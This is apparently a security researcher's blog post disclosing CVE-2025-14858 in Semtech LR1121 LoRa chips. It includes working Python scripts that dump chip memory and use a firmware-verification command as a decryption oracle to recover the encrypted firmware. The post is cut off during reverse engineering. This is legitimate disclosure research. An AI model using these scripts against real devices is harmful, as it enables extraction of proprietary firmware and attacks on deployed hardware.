---
layout: post
title:  "LoRa under attack: running our own code in secure LoRaWAN Semtech LR11xx chips: CVE-2025-14857, CVE-2025-14858"
date:   2026-04-06 11:26:41 +0700
categories: lr11xx
tags: [lr11xx, hardware, cve-2025-14857, cve-2025-14858, cve-2025-14859, semtech, security]
author: radioegor146
---

* TOC
{:toc}


## How it all started

Some time ago, several of my friends became interested in Meshtastic. It is a really nice protocol and software for creating mesh networks, in which each device connects directly to other nearby devices. These networks use small devices for communication. LoRa, which stands for Long Range, was chosen as the main radio communication protocol and allows long-distance wireless transmission with low power consumption.

LoRa has one key advantage over other protocols: its operating range. This is determined by some dark RF magic about how packets are received and transmitted. It allows someone to catch a LoRa packet even if the power is below the noise level.

A Meshtastic node usually has a LoRa chip and a microcontroller that acts as a second layer. Semtech's products, such as the SX126x, SX127x, and the recently released LR11xx, are primarily used as LoRa chips. This article will discuss the LR11xx.

I was bored, so I decided to take a look at the latest LR11xx chips, such as the LR1121. While googling them, I found something interesting: these chips are flashable. The firmware for them can be found on Semtech's GitHub [<sup>[7]</sup>](#references). My initial observations showed that the firmware was encrypted, likely using a block cipher such as AES. Its size was a multiple of 16 bytes, and the entropy was very high:

```
00000000: 5344 cf82 911b 2526 6487 3578 d78f 89a2  SD....%&d.5x....
00000010: ff6f b7b5 2a23 2f0e 8222 3dbd c2a8 0c47  .o..*#/.."=....G
00000020: 2786 9379 1a9e 71dd 95c0 e8a6 840a 2fe6  '..y..q......./.
00000030: bf76 db44 e9a6 5a38 0890 ea4e dc58 bc3c  .v.D..Z8...N.X.<
00000040: da2b 66d8 53ca 71dc b53a e953 3c5d 0083  .+f.S.q..:.S<]..
00000050: c28a f844 ebc4 43b9 1912 a6a2 d487 9700  ...D..C.........
00000060: db07 2816 9901 8cb5 b4be 1e5a ce20 d499  ..(........Z. ..
00000070: 4f46 e7cf ca4e d7d7 6eb2 39b3 b2aa 5797  OF...N..n.9...W.
00000080: f644 d94a 0e42 f1eb 0ad6 2751 1d95 ce55  .D.J.B....'Q...U
00000090: addc 0300 b26f 4c1b fe90 164f 315d 5167  .....oL....O1]Qg
000000a0: 153a efe0 4182 67ef 4c22 158f bac2 2c11  .:..A.g.L"....,.
000000b0: b3d8 f639 6edb 6593 889b 8faf a62c 91ea  ...9n.e......,..
000000c0: b278 6be3 3c5d 88a5 1185 22c3 ce08 b8f2  .xk.<]....".....
000000d0: efd4 20e9 b634 cb3a e5db ce02 9e3e 4048  .. ..4.:.....>@H
000000e0: 1132 6bbd 4f2f f14c 3ec1 ed38 1b2e b4b4  .2k.O/.L>..8....
000000f0: c95b 972f 0707 15fa d992 2aee f0b1 5eee  .[./......*...^.
```

However, further investigation of the User Manual showed that the chips are also very interesting features: commands like `ReadRegMem32` and `WriteRegMem32`:

![screenshot of user manual's ReadRegMem32 and WriteRegMem32 commands](/images/2026-04-06-lora-under-attack/image.png)

This led me to wonder: could these be used to read and write memory, enabling custom code execution? 

This is what the story will be about in this article.

## Interacting with chips

Some time has passed, and after 3 months from the first thought, I finally got my hands on the LR1121 chip, in the form of a Radiomaster Nomad (my friend, who was interested in Meshtastic, also got interested in drones). What I had now was very convenient - an ESP32 MCU that was directly connected to two LR1121 chips.

Now, I need to create a test rig (an experimental setup) for communication with the LR1121 chip. What protocol does it use?

Basically, it is SPI with one additional signal (BUSY) [<sup>\[2\]</sup>](#references). User manual states this clearly, and even provides us with some waveforms:

![LR1121 SPI protocol](/images/2026-04-06-lora-under-attack/image-2.png)

First, you need to assert the `CS` (chip select) signal low, and then send two bytes of command type, and our command data:

![first part of SPI transaction](/images/2026-04-06-lora-under-attack/image-3.png)

Then, you wait for the `BUSY` signal to become high (after the chip has done processing our command), and then read the status and data from the chip:

![second part of SPI transaction](/images/2026-04-06-lora-under-attack/image-4.png)

I've written some code for this harness that lets me interact with the chip from my PC using a Python tool. You can check it out in the repo.

The first script that I've written was to get LR1121's version (you can find it as `article_1_get_version.py` [<sup>\[1\]</sup>](#references)):
```python
# article_1_get_version.py

from lr11xx import LR11xxClient
from constants import SERIAL

client = LR11xxClient(SERIAL)
client.set_busy_mode(False)

print(client.send_command(0x0101, [], 4))
```

And I got our first output:
```
(toolkit) root@lr11xx-test:~/toolkit# python article_1_get_version.py
using configuration 'radiomaster'
(129, 0, 3, [98, 3, 1, 3])
(toolkit) root@lr11xx-test:~/toolkit#
```

By checking the user manual, we can see:
- Command status = 3 = CMD_DAT
- HW revision is 98 (whatever that means?)
- Our chip is LR1121
- FW version is 01.03

Hooray! I finally got some comms!

In future script code, I'll remove imports and client creation parts if not directly required.

## Investigating chip memory

After some tests with other commands, I tried to use some memory read commands (`ReadRegMem32`):
```python
# article_2_test_read_memory.py

from utils import u32_to_array

address = 0
size = 4

print(client.send_command(0x0106, u32_to_array(address)[1:] + [size // 4], size))
```

Unfortunately, my first try failed (as seen by the third field - LR1121 status code - 0 = CMD_FAIL):
```
(toolkit) root@lr11xx-test:~/toolkit# python article_2_test_read_memory.py
using configuration 'radiomaster'
(129, 0, 1, [19, 0, 64, 0])
(toolkit) root@lr11xx-test:~/toolkit# 
```

But! We can try to scan from what addresses memory can be read by iterating over chunks of 4096 bytes (to save time on reading the whole memory), and skipping on chunks that fail:
```python
# article_3_scan_memory.py

size = 4

for address in range(0, 0x1000000, 0x1000):
  if address % 0x10000 == 0:
    print(f'reading at {hex(address)}')
  _, _, lr11xx_return_code, _ = client.send_command(0x0106, u32_to_array(address)[1:] + [size // 4], size)
  if lr11xx_return_code == 3:
    print(f'read at {hex(address)}!')
```

And I got this:
```
(toolkit) root@lr11xx-test:~/toolkit# python article_3_scan_memory.py
using configuration 'radiomaster'
reading at 0x0
reading at 0x10000
...
reading at 0xc0000
read at 0xc1000!
reading at 0xd0000
...
reading at 0x7f0000
reading at 0x800000
read at 0x800000!
read at 0x801000!
read at 0x802000!
read at 0x803000!
read at 0x804000!
read at 0x805000!
read at 0x806000!
read at 0x807000!
read at 0x808000!
read at 0x809000!
read at 0x80a000!
read at 0x80b000!
read at 0x80c000!
read at 0x80d000!
read at 0x80e000!
read at 0x80f000!
reading at 0x810000
reading at 0x820000
...
reading at 0xef0000
reading at 0xf00000
read at 0xf00000!
read at 0xf01000!
read at 0xf02000!
read at 0xf03000!
read at 0xf04000!
read at 0xf0f000!
reading at 0xf10000
read at 0xf11000!
read at 0xf12000!
read at 0xf13000!
read at 0xf14000!
read at 0xf15000!
read at 0xf16000!
read at 0xf17000!
read at 0xf18000!
read at 0xf19000!
read at 0xf1a000!
read at 0xf1f000!
reading at 0xf20000
read at 0xf20000!
reading at 0xf30000
read at 0xf30000!
reading at 0xf40000
reading at 0xf50000
reading at 0xf60000
reading at 0xf70000
reading at 0xf80000
reading at 0xf90000
reading at 0xfa0000
reading at 0xfb0000
reading at 0xfc0000
reading at 0xfd0000
reading at 0xfe0000
reading at 0xff0000
(toolkit) root@lr11xx-test:~/toolkit#
```

Now we can start to make some assumptions about the address space:
- `0xC1000` - `0xC2000`: looks like some small data (factory settings?)
- `0x800000` - `0x810000`: looks like RAM (64kB)
- `0xF00000` - `0x1000000`: looks like peripherals (some sparse regions in this range)

By following our assumption, I can try to dump RAM:
```python
# article_4_dump_ram.py

with open("ram.bin", "wb") as f:
  chunk_size = 128

  for address in range(0x800000, 0x810000, chunk_size):
    _, _, lr11xx_return_code, data = client.send_command(0x0106, u32_to_array(address) + [chunk_size // 4], chunk_size)
    f.write(bytes(data))
print('done!')
```

Result follows:
```
(toolkit) root@lr11xx-test:~/toolkit# python article_4_dump_ram.py
using configuration 'radiomaster'
done!
(toolkit) root@lr11xx-test:~/toolkit# xxd ram.bin | head -n 20
00000000: 07fc 0000 e7c1 d17f 1c70 c9b4 4696 95cc  .........p..F...
00000010: 2cee 0158 6242 ad55 0265 0100 e20f 0062  ,..XbB.U.e.....b
00000020: 10fc 4ac6 3930 0000 0000 0000 0164 d3ff  ..J.90.......d..
00000030: 0000 0000 0000 0000 0000 0000 021f 0100  ................
00000040: 0604 0000 000a 3704 0000 0000 0000 0000  ......7.........
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: ebe6 1212 2ae9 099e 336d c9cd 8dc1 e5fd  ....*...3m......
00000070: f28f dfd7 3ad9 98ee fcb2 c9cf 1eb1 33b4  ....:.........3.
00000080: 9171 1b50 19c2 f07a 08b6 1d1e d71c 75f6  .q.P...z......u.
00000090: 8e84 48bc 6f54 2137 d378 8890 e875 5a09  ..H.oT!7.x...uZ.
000000a0: 0051 d91c ec19 9ab7 af5e 78bd c301 5772  .Q.......^x...Wr
000000b0: a748 2132 5504 0c00 f617 3a5c 0978 af0e  .H!2U.....:\.x..
000000c0: 95cd b01f b193 3e62 7971 6ee8 7116 d5d8  ......>byqn.q...
000000d0: 9d74 8430 17eb 421e fd13 1c94 a857 79bb  .t.0..B......Wy.
000000e0: 16b4 6c13 8617 692e 838c 76e5 4cf3 edd9  ..l...i...v.L...
000000f0: 569c 2c10 1624 807d 3abb 90a8 010a cf68  V.,..$.}:......h
00000100: 3736 6943 2142 e918 cd30 e569 4d18 0cfc  76iC!B...0.iM...
00000110: 122e a7f1 c344 462f 1baa 39c6 f1d3 6411  .....DF/..9...d.
00000120: 13b7 5b04 fe1a af72 bacb 9049 d7bf dafb  ..[....r...I....
00000130: 50e6 3b30 a5c8 6be8 8b6a a248 63e8 e5c4  P.;0..k..j.Hc...
(toolkit) root@lr11xx-test:~/toolkit#
```

Unfortunately, there is no obvious stuff in RAM, like strings or anything else.

*We need to dig deeper...*

## Firmware and so on: CVE-2025-14858

As I discussed earlier, the device's firmware is encrypted, and for deeper analysis, we want it decrypted.

After looking for firmware-related functions in the user manual, I stumbled upon this:

![CryptoCheckEncryptedFirmwareImage command from user manual](/images/2026-04-06-lora-under-attack/image-5.png)

This command accepts a firmware chunk and verifies its correctness. As far as I think, if they want to verify a block, they'd probably decrypt it and somehow add it to a hash? What if they forgot to clean the decrypted block from RAM after decryption?

Let's test this theory by diffing RAM contents before and after feeding the firmware block to the chip:

```python
# article_5_feed_firmware_block.py
import sys

offset = int(sys.argv[1], 16)

with open("lr1121_transceiver_0103.bin", "rb") as f:
  firmware = f.read()

print(client.send_command(0x050F, u32_to_array((offset + 0xFF) // 0x100) + list(firmware[offset:offset + 256]), 0))
```

Result:
```
(toolkit) root@lr11xx-test:~/toolkit# python article_5_feed_firmware_block.py 0x0
using configuration 'radiomaster'
(129, 0, 2, [])
(toolkit) root@lr11xx-test:~/toolkit# python article_4_dump_ram.py
using configuration 'radiomaster'
done!
(toolkit) root@lr11xx-test:~/toolkit# cp ram.bin ram.old.bin
(toolkit) root@lr11xx-test:~/toolkit# python article_5_feed_firmware_block.py 0x100
using configuration 'radiomaster'
(129, 0, 2, [])
(toolkit) root@lr11xx-test:~/toolkit# python article_4_dump_ram.py
using configuration 'radiomaster'
done!
(toolkit) root@lr11xx-test:~/toolkit# xxd ram.old.bin > ram.old.txt
(toolkit) root@lr11xx-test:~/toolkit# xxd ram.bin > ram.txt
(toolkit) root@lr11xx-test:~/toolkit# diff ram.old.txt ram.txt
74c74
< 00000490: bece 3a5f dad5 5300 0000 0000 0001 0000  ..:_..S.........
---
> 00000490: fd26 3a5f dad5 5300 0000 0000 0001 0000  .&:_..S.........
85c85
< 00000540: 0000 0000 0000 40fc 0000 0040 0000 0000  ......@....@....
---
> 00000540: 0000 0000 0000 40fc 0000 0080 0000 0100  ......@.........
134,142c134,142
< 00000850: 0000 0000 44f6 9757 420e 4ad9 d60a ebf1  ....D..WB.J.....
< 00000860: 951d 5127 dcad 55ce 6fb2 0003 90fe 1b4c  ..Q'..U.o......L
< 00000870: 5d31 4f16 3a15 6751 8241 e0ef 224c ef67  ]1O.:.gQ.A.."L.g
< 00000880: c2ba 8f15 d8b3 112c db6e 39f6 9b88 9365  .......,.n9....e
< 00000890: 2ca6 af8f 78b2 ea91 5d3c e36b 8511 a588  ,...x...]<.k....
< 000008a0: 08ce c322 d4ef f2b8 34b6 e920 dbe5 3acb  ..."....4.. ..:.
< 000008b0: 3e9e 02ce 3211 4840 2f4f bd6b c13e 4cf1  >...2.H@/O.k.>L.
< 000008c0: 2e1b 38ed 5bc9 b4b4 0707 2f97 92d9 fa15  ..8.[...../.....
< 000008d0: b1f0 ee2a 0000 ee5e a3b7 3a21 b11d 24be  ...*...^..:!..$.
---
> 00000850: 0000 0000 c5a6 9780 d162 a48b b499 9f0e  .........b......
> 00000860: 3287 14c3 17bd 6939 7494 d3ae 08f3 3a83  2.....i9t.....:.
> 00000870: ebcd 2da2 7ab6 f615 618c c966 7b8c a389  ..-.z...a..f{...
> 00000880: 95be eb15 939a 49a2 05c1 2763 eeff 58ca  ......I...'c..X.
> 00000890: 06f5 30da b8ef 62b3 5135 e3d0 0e7f 0820  ..0...b.Q5.....
> 000008a0: 35c7 bf22 0d1e e647 ad13 1720 7a44 75ed  5.."...G... zDu.
> 000008b0: 7350 7763 b30f 57a3 ce14 99fd 0ff0 865c  sPwc..W........\
> 000008c0: b5e5 ee83 64c9 ae51 efcb ddc8 d259 5d9c  ....d..Q.....Y].
> 000008d0: 5347 cfd8 0000 e153 a3b7 3a21 b11d 24be  SG.....S..:!..$.
163c163
< 00000a20: 0b7b 7a34 af0c 52c9 020c 56ef 7557 618a  .{z4..R...V.uWa.
---
> 00000a20: 1e88 2e40 b843 a86a 2c44 81f6 2498 b40b  ...@.C.j,D..$...
1448,1450c1448,1450
< 00005a70: d5ac 9b71 51fb f573 0080 07d6 0000 0000  ...qQ..s........
< 00005a80: 0000 0100 00f1 5004 35ca 0000 0000 0000  ......P.5.......
< 00005a90: 0000 0000 0000 0100 0008 6484 0000 0011  ..........d.....
---
> 00005a70: d5ac 9b71 51fb f573 0080 07d6 0000 0100  ...qQ..s........
> 00005a80: 0000 0100 00f1 5004 35ca 0000 0000 0025  ......P.5......%
> 00005a90: 00f1 7018 0000 00ca 0000 009a 0000 0039  ..p............9
1455,1469c1455,1469
< 00005ae0: 0000 0000 f840 0800 f828 0900 f828 0900  .....@...(...(..
< 00005af0: f828 0900 f828 0900 f828 0900 f828 0900  .(...(...(...(..
< 00005b00: f828 0900 f828 0900 f828 0900 f828 0900  .(...(...(...(..
< 00005b10: f828 0900 f828 0900 f828 0900 f828 0900  .(...(...(...(..
< 00005b20: f828 0900 98aa 0800 d0a4 0800 6ca9 0800  .(..........l...
< 00005b30: 8ca5 0800 9ca5 0800 3ca7 0800 14a8 0800  ........<.......
< 00005b40: 18a8 0800 1ca8 0800 20a8 0800 24a8 0800  ........ ...$...
< 00005b50: 28a8 0800 2ca8 0800 30a8 0800 34a8 0800  (...,...0...4...
< 00005b60: 38a8 0800 3ca8 0800 40a8 0800 44a8 0800  8...<...@...D...
< 00005b70: 48a8 0800 4ca8 0800 50a8 0800 b0aa 0800  H...L...P.......
< 00005b80: 94aa 0800 f8a9 0800 34a9 0800 acaa 0800  ........4.......
< 00005b90: 14aa 0800 30a9 0800 68a9 0800 00a9 0800  ....0...h.......
< 00005ba0: 98a4 0800 98a5 0800 38a9 0800 b8a4 0800  ........8.......
< 00005bb0: 9ca4 0800 d4a4 0800 90a9 0800 54a8 0800  ............T...
< 00005bc0: fca8 0800 4000 0000 0000 0004 0009 1d3c  ....@..........<
---
> 00005ae0: 0000 0000 8000 9804 6f70 e078 0a20 808f  ........op.x. ..
> 00005af0: 0000 0000 3c08 0100 2608 0000 2220 800f  ....<...&..." ..
> 00005b00: 0900 e432 6920 4000 e078 fef1 f1c0 e078  ...2i @..x.....x
> 00005b10: 2220 800f 0800 5445 d1c0 e07e f1c0 2220  " ....TE...~.."
> 00005b20: 800f 0800 2c45 d1c0 e07e 0000 e07e e078  ....,E...~...~.x
> 00005b30: e8c3 a1c1 c340 0900 803c 84e8 0c70 c8c7  .....@...<...p..
> 00005b40: c342 0900 7c3b 008a c9e0 0c71 0bf4 218a  .B..|;.....q..!.
> 00005b50: cee1 09f4 228a c9e1 05f4 038a 1473 0c72  ...."........s.r
> 00005b60: c2f7 c8c7 c46a 07f4 a086 08e2 4847 4846  .....j......HGHF
> 00005b70: 11f0 cb45 0800 e041 c947 0df0 08e6 c947  ...E...A.G.....G
> 00005b80: 1300 0000 4e20 0220 2c70 6a08 2000 8140  ....N . ,pj. ..@
> 00005b90: c947 0187 8087 1470 1040 13f2 4027 0e12  .G.....p.@..@'..
> 00005ba0: f2f6 80c3 c140 0241 607d 8142 4020 c020  .....@.A`}.B@ .
> 00005bb0: 6c20 4000 f860 08e0 0847 0846 ebf1 e0ec  l @..`...G.F....
> 00005bc0: bef1 e078 4000 0000 0000 0004 0009 1d3c  ...x@..........<
(toolkit) root@lr11xx-test:~/toolkit#
```

Wait a second... What is there at offset `0x5AE0` (address `0x805AE0`)? An interrupt vector table at the beginning of the firmware? My theory was right! They definitely forgot to clear the decrypted firmware block from RAM, and even provided all the primitives to decrypt it using the chip as an oracle!

This was the first vulnerability that I found, and it got the rating of 5.4/10 (medium) by CVSS: **CVE-2025-14858**

But we can still see that only part of the decrypted firmware is available; the rest is overwritten by other stuff...
How can we decrypt the full firmware?

## A tale of using wrong cryptography schemes

But how do they decrypt firmware? The user manual mentions an AES accelerator on the chip itself, so it is possible they use AES for it. But what flavor? ECB? CBC? CTR? GCM?
Let's check if they use AES-ECB just by trying to decrypt with a block with an offset of just 16 bytes (but the offset that is provided to the chip must still be 0):
```
(toolkit) root@lr11xx-test:~/toolkit# python article_5_feed_firmware_block.py 0x0
using configuration 'radiomaster'
(129, 0, 2, [])
(toolkit) root@lr11xx-test:~/toolkit# python article_5_feed_firmware_block.py 0x10
using configuration 'radiomaster'
(129, 0, 0, [])
(toolkit) root@lr11xx-test:~/toolkit# python article_4_dump_ram.py
using configuration 'radiomaster'
done!
(toolkit) root@lr11xx-test:~/toolkit# xxd ram.bin | head -n 1470 | tail -n 16
00005ae0: 0000 0000 7ae7 4d53 de0d 1291 801d 8e64  ....z.MS.......d
00005af0: 5aa1 86d7 f828 0900 f828 0900 f828 0900  Z....(...(...(..
00005b00: f828 0900 f828 0900 f828 0900 f828 0900  .(...(...(...(..
00005b10: f828 0900 98aa 0800 d0a4 0800 6ca9 0800  .(..........l...
00005b20: 8ca5 0800 9ca5 0800 3ca7 0800 14a8 0800  ........<.......
00005b30: 18a8 0800 1ca8 0800 20a8 0800 24a8 0800  ........ ...$...
00005b40: 28a8 0800 2ca8 0800 30a8 0800 34a8 0800  (...,...0...4...
00005b50: 38a8 0800 3ca8 0800 40a8 0800 44a8 0800  8...<...@...D...
00005b60: 48a8 0800 4ca8 0800 50a8 0800 b0aa 0800  H...L...P.......
00005b70: 94aa 0800 f8a9 0800 34a9 0800 acaa 0800  ........4.......
00005b80: 14aa 0800 30a9 0800 68a9 0800 00a9 0800  ....0...h.......
00005b90: 98a4 0800 98a5 0800 38a9 0800 b8a4 0800  ........8.......
00005ba0: 9ca4 0800 d4a4 0800 90a9 0800 54a8 0800  ............T...
00005bb0: fca8 0800 f828 0900 f828 0900 f828 0900  .....(...(...(..
00005bc0: f828 0900 4000 0000 0000 0004 0009 1d3c  .(..@..........<
00005bd0: 0000 0001 0000 0000 0008 9e84 0000 0006  ................
(toolkit) root@lr11xx-test:~/toolkit#
```

What? The data still looks decrypted, but the first row (at `0x5AE0`) is corrupted?

And that is my dear readers, a simple case of CBC block chaining. Let's go to Wikipedia [<sup>\[6\]</sup>](#references) to look at the scheme:

![CBC encryption scheme](/images/2026-04-06-lora-under-attack/image-6.png)

As far as we can see, the previous ciphertext block is used to deXOR the next plaintext block. When I shifted the input data by 16 bytes, the next block's XOR key is invalid now, because it would've been the previous firmware ciphertext (the first 16 bytes) instead of the IV they use. And now I can make a tool to fully decrypt our firmware (however, keep in mind that we still don't know the IV that they use):

```python
# utils.py

# at this point, I introduce a function named 'read_memory_or_error' as a helper for reading contiguous regions of memory:
def u32_to_array(value):
  return [value // 16777216, value // 65536 % 256, value // 256 % 256, value % 256]

def read_memory(client, address_from, total_size, verbose=False):
  if address_from % 4 != 0:
    raise ValueError("address not aligned to 4 bytes")
  address_to = address_from + (total_size + 3) // 4 * 4
  result = bytearray()
  for address in range(address_from, address_to, 0x100):
    size = min(address_to - address, 256)
    _, esp32_status, lr11xx_return_code, data = client.send_command(0x0106, u32_to_array(address) + [size // 4], size)
    if esp32_status != ESP32_STATUS_OK:
        return False, True, ESP32_STATUS_NAMES.get(esp32_status, f'Unknown status 0x{esp32_status:02X}')
    result += bytes(data)
    if lr11xx_return_code != 3:
        return False, False, f"wrong LR11xx status: {(lr11xx_return_code >> 1) & 7}", result
    if verbose:
      print(f"dumping from {hex(address)} of {hex(size)}")
  return True, result[0:total_size]

def read_memory_or_error(client, address_from, total_size, verbose=False):
  result = read_memory(client, address_from, total_size, verbose)
  if not result[0]:
    if result[1]:
      raise ValueError(f"timeout: {result[2]}")
    else:
      raise ValueError(f"lr11xx: {result[2]}")
  return result[1]
```

```python
# article_6_decrypt_firware.py

firmware_path = sys.argv[1]

with open(f"{firmware_path}", "rb") as f:
  firmware = f.read()

# it uses AES-CBC-128 for each block of 256 bytes with fixed IV and key per block
# so to decrypt each block, we do two requests for 128 bytes each
# one with b'\x00' * 16 prepended (here I guess that they use zeroes as IV), and one with previous 16 byte encrypted block prepended

memory_location = 0x805AE0

result = bytearray()

def ensure_ok(response):
  print(response)
  if response[2] != 0:
    raise ValueError('wut? ' + str(response))

for block_offset in range(0, len(firmware), 0x100):
  first_block = firmware[block_offset:block_offset + 0x80]
  iv = [0] * 16
  first_request = bytes(iv) + first_block
  ensure_ok(client.send_command(0x050f, [0, 0, 0, 0] + list(first_request), 3))
  first_result = read_memory_or_error(client, memory_location, 0x100)[0x14:0x14 + 0x80]
  result += first_result[0:len(first_block)]
  print(f"decrypted {hex(block_offset + 0x80)} of {hex(len(firmware))}")

  second_block = firmware[block_offset + 0x80:block_offset + 0x100]
  if len(second_block) == 0:
    with open(f"{firmware_path}.dec", "wb") as f:
      f.write(result)
    continue
  second_request = firmware[block_offset + 0x70:block_offset + 0x80] + second_block
  ensure_ok(client.send_command(0x050f, [0, 0, 0, 0] + list(second_request), 3))
  second_result = read_memory_or_error(client, memory_location, 0x100)[0x14:0x14 + 0x80]
  result += second_result[0:len(second_block)]
  print(f"decrypted {hex(block_offset + 0x100)} of {hex(len(firmware))}")

  with open(f"{firmware_path}.dec", "wb") as f:
    f.write(result)

```

Result:
```
(toolkit) root@lr11xx-test:~/toolkit# python article_6_decrypt_firware.py lr1121_transceiver_0103.bin
using configuration 'radiomaster'
(129, 0, 0, [19, 0, 64])
decrypted 0x80 of 0x10420
(129, 0, 0, [19, 0, 64])
decrypted 0x100 of 0x10420
(129, 0, 0, [19, 0, 64])
decrypted 0x180 of 0x10420
...
(129, 0, 0, [19, 0, 64])
decrypted 0x10380 of 0x10420
(129, 0, 0, [19, 0, 64])
decrypted 0x10400 of 0x10420
(129, 0, 0, [19, 0, 64])
decrypted 0x10480 of 0x10420
(toolkit) root@lr11xx-test:~/toolkit# xxd lr1121_transceiver_0103.bin.dec
00000000: f840 0800 f828 0900 f828 0900 f828 0900  .@...(...(...(..
00000010: f828 0900 f828 0900 f828 0900 f828 0900  .(...(...(...(..
00000020: f828 0900 f828 0900 f828 0900 f828 0900  .(...(...(...(..
00000030: f828 0900 f828 0900 f828 0900 f828 0900  .(...(...(...(..
00000040: 98aa 0800 d0a4 0800 6ca9 0800 8ca5 0800  ........l.......
00000050: 9ca5 0800 3ca7 0800 14a8 0800 18a8 0800  ....<...........
00000060: 1ca8 0800 20a8 0800 24a8 0800 28a8 0800  .... ...$...(...
00000070: 2ca8 0800 30a8 0800 34a8 0800 38a8 0800  ,...0...4...8...
00000080: 3ca8 0800 40a8 0800 44a8 0800 48a8 0800  <...@...D...H...
00000090: 4ca8 0800 50a8 0800 b0aa 0800 94aa 0800  L...P...........
000000a0: f8a9 0800 34a9 0800 acaa 0800 14aa 0800  ....4...........
000000b0: 30a9 0800 68a9 0800 00a9 0800 98a4 0800  0...h...........
000000c0: 98a5 0800 38a9 0800 b8a4 0800 9ca4 0800  ....8...........
000000d0: d4a4 0800 90a9 0800 54a8 0800 fca8 0800  ........T.......
000000e0: f828 0900 f828 0900 f828 0900 f828 0900  .(...(...(...(..
000000f0: 9a13 ca35 fc40 0000 db44 8000 005c db42  ...5.@...D...\.B
00000100: 8000 9904 6f70 e078 0a20 808f 0000 0000  ....op.x. ......
00000110: 3c08 0100 2608 0000 2220 800f 0900 e432  <...&..." .....2
00000120: 6920 4000 e078 fef1 f1c0 e078 2220 800f  i @..x.....x" ..
...
{% raw %}000102f0: dd67 8612 0372 5807 b598 eeed 34d2 6fa7  .g...rX.....4.o.
00010300: 8239 da4d 3647 6d32 80ad dbd8 01e7 5a92  .9.M6Gm2......Z.
00010310: b70d ec78 4e10 1565 f8fa a38f 79b0 22c5  ...xN..e....y.".
00010320: cf5a 942f 7b25 2050 cdcf 96ba 4c85 17f0  .Z./{% P....L...
00010330: fa6f a11a 247a 7f0f 9290 c9e5 13da 48af  .o..$z........H.
00010340: a530 fe45 114f 4a3a a7a5 fcd0 26ef 7d9a  .0.E.OJ:....&.}.
00010350: 9005 cb70 9ac4 c1b1 2c2e 775b ad64 f611  ...p....,.w[.d..
00010360: 1b8e 40fb aff1 f484 191b 426e 9851 c324  ..@.......Bn.Q.$
00010370: 2ebb 75ce f0ae abdb 4644 1d31 c70e 9c7b  ..u.....FD.1...{
00010380: 71e4 2a91 c59b 9eee 7371 2804 f23b a94e  q.*.....sq(..;.N
00010390: 44d1 1fa4 0cbe 0800 28c0 0800 38c0 0800  D.......(...8...
000103a0: 0cbe 0800 74bd 0800 0cbe 0800 f8e3 0800  ....t...........
000103b0: 00e4 0800 2ce4 0800 0ce4 0800 14e4 0800  ....,...........
000103c0: 1ce4 0800 c8f7 0800 20f5 0800 acf5 0800  ........ .......
000103d0: c8f6 0800 20f5 0800 acf5 0800 20f5 0800  .... ....... ...
000103e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000103f0: 5907 d872 f6f6 4d27 0ce3 6432 7f1a 5e41  Y..r..M'..d2..^A
00010400: b08e b65e 2bed 1956 b908 0e7b 5887 fb50  ...^+..V...{X..P
00010410: 865c b1d8 b462 b53f 0808 0808 0808 0808  .\...b.?........{% endraw %}
(toolkit) root@lr11xx-test:~/toolkit#
```

Woo hoo! I finally have decrypted firmware!
However, do you remember that we don't know what IV is used for decryption? Well, as initial IV only affects the first block (first 16 bytes), I can look at different headers of different blocks:

```
0000fa00: 20ad f700 2000 01ad 8909 d500 cb45 f200   ... ........E..
0000fb00: 0092 fe26 0602 857a 4029 0011 0019 8201  ...&...z@)......
0000fc00: 0000 fc00 0000 0000 0200 0000 0000 0000  ................
0000fd00: 309c f500 c08e 0800 e021 0900 54d9 0800  0........!..T...
```

I can see (especially in `0xFC00` block) that it looks like the IV is just a block offset! Now let's pass it in our decryption script like that:
```python
# was
iv = [0] * 16
# now
iv = [0] * 16
iv[0] = block_offset % 256
iv[1] = block_offset // 256 % 256
iv[2] = block_offset // 65536 % 256
iv[3] = block_offset // 16777216 % 256
```

And now I finally have a fully decrypted firmware!

## Firmware reverse engineering & analysis

So, now I have a raw, unknown, but decrypted firmware image. What's next? Well, one tool will definitely help me: [cpu_rec](https://github.com/airbus-seclab/cpu_rec):

```
cpu_rec ./lr1121_transceiver_0103.bin.dec
./lr1121_transceiver_0103.bin.dec     full(0x10420)  ARcompact    chunk(0xf800;62)    ARcompact
```

ARcompact? What? According to Wikipedia [<sup>\[3\]</sup>](#references), it is an IP core for a CPU for embedded applications from Synopsys:

![ARC CPU architecture from Wikipedia](/images/2026-04-06-lora-under-attack/image-7.png)

Never heard of it, but for this application... it fits greatly!
And, to my surprise, IDA Pro has a decompiler support for this processor!
But what is the base of this firmware? Looking at the interrupt vector table, I see that the lowest possible (and first) vector is `0x840F8`:
```
00000000: f840 0800 f828 0900 f828 0900 f828 0900  .@...(...(...(..
00000010: f828 0900 f828 0900 f828 0900 f828 0900  .(...(...(...(..
00000020: f828 0900 f828 0900 f828 0900 f828 0900  .(...(...(...(..
00000030: f828 0900 f828 0900 f828 0900 f828 0900  .(...(...(...(..
00000040: 98aa 0800 d0a4 0800 6ca9 0800 8ca5 0800  ........l.......
00000050: 9ca5 0800 3ca7 0800 14a8 0800 18a8 0800  ....<...........
00000060: 1ca8 0800 20a8 0800 24a8 0800 28a8 0800  .... ...$...(...
00000070: 2ca8 0800 30a8 0800 34a8 0800 38a8 0800  ,...0...4...8...
00000080: 3ca8 0800 40a8 0800 44a8 0800 48a8 0800  <...@...D...H...
00000090: 4ca8 0800 50a8 0800 b0aa 0800 94aa 0800  L...P...........
000000a0: f8a9 0800 34a9 0800 acaa 0800 14aa 0800  ....4...........
000000b0: 30a9 0800 68a9 0800 00a9 0800 98a4 0800  0...h...........
000000c0: 98a5 0800 38a9 0800 b8a4 0800 9ca4 0800  ....8...........
000000d0: d4a4 0800 90a9 0800 54a8 0800 fca8 0800  ........T.......
000000e0: f828 0900 f828 0900 f828 0900 f828 0900  .(...(...(...(..
000000f0: 9a13 ca35 fc40 0000 db44 8000 005c db42  ...5.@...D...\.B
```

I can assume that the base is at `0x84000` (because of alignment) and put the binary in IDA (I've tried ARCv2 first, as it was the newest possible in IDA):

![ARCv2 selection in IDA](/images/2026-04-06-lora-under-attack/image-8.png)
![ROM/RAM offsets](/images/2026-04-06-lora-under-attack/image-9.png)

After loading, IDA found multiple functions!

![functions in IDA](/images/2026-04-06-lora-under-attack/image-10.png)

But, in ARCv2, the first entry in the interrupt table is reset, and I can start to explore from it:
```c
void __noreturn _RESET()
{
  int v0; // r0
  int v1; // r0

  v0 = sub_8414C(0);
